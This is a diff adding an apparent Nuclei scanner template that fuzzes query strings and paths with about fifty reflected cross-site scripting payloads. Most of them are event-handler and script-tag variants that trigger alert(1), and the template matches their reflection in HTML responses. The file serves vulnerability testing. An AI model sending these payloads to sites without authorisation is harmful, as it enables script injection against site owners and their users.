@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></a>"
+        - "<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript>"
+        - "<marquee id=x tabindex=1 onactivate=alert(1)></marquee><input autofocus>"
+        - "<input type=\"text\" autofocus>"
+        - "<video autoplay controls ontimeupdate=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>"
+        - "<embed draggable=\"true\" ondragleave=\"alert(1)\">test</embed>"
+        - "<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input autofocus>"
+        - "<nobr onclick=\"alert(1)\">test</nobr>"
+        - "<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>"
+        - "<script type=\"text/javascript\">javascript:alert(1)</script>"
+        - "<multicol id=x tabindex=1 ondeactivate=alert(1)></multicol><input id=y autofocus>"
+        - "<optgroup onkeypress=\"alert(1)\" contenteditable>test</optgroup>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><plaintextitem ondrop=alert(1) contenteditable>test</plaintextitem>"
+        - "<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>"
+        - "<multicol id=x tabindex=1 ondeactivate=alert(1)></multicol><input id=y autofocus>"
+        - "<frameset><frame src=\"javascript:alert(1)\"></frameset>"
+        - "<svg draggable=\"true\" ondragleave=\"alert(1)\">test</svg>"
+        - "</br></br><script>alert(1)</script>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<marquee draggable=\"true\" ondragleave=\"alert(1)\">test</marquee>"
+        - "<script>alert(1)</script>"
+        - "<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr>"
+        - "&lt;OBJECT TYPE=\"text/xml-scriptlet\" DATA=\"#xss#\">"
+        - "<marquee onmousedown=\"alert(1)\">test</marquee>"
+        - "<script>alert(1)</script>\\n</div>\\x0C<div id=xss-payload-list></div>"
+        - "<IMG SRC=\"javascript:alert(1);\">"
+        - "<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input autofocus>"
+        - "<basefont draggable=\"true\" ondragleave=\"alert(1)\">test</basefont>"
+        - "<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>"
+        - "<svg><script>alert(1)</script>"
+        - "</div>"
+        - "<tt onbeforecut=\"alert(1)\" contenteditable>test</tt>"
+        - "<iframe src=\"about:blank\" onload=alert(1)>"
+        - "<menu id=x tabindex=1 onfocusin=alert(1)></menu>"
+        - "<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>"
+        - "<iframe src=about:javascript:alert(1)></iframe>"
+        - "<img src\\x0D=x onerror=\"javascript:alert(1)\"></img>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>"
+        - "<SCRIPT>alert('XSS')</script>"
+        - "<basefont onmouseup=\"alert(1)\">test</basefont>"
+        - "<iframe src=\"http://www.google.com\"></iframe>"
+        - "<mark id=x tabindex=1 onfocusin=alert(1)></mark>"
+        - "<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>"
+        - "<IMG SRC=x onerror\\x0D=javascript:alert(1)://><img/src=\"x\"onerror=javascript:alert(1)>"
+        - "<img src=x onerror=javascript:alert(1);>//"
+        - "<output id=x style=\"behavior:url('#default#time2');\">"
+        - "<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input autofocus>"
+        - "<menuitem onkeyup=\"alert(1)\" contenteditable>test</menuitem>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
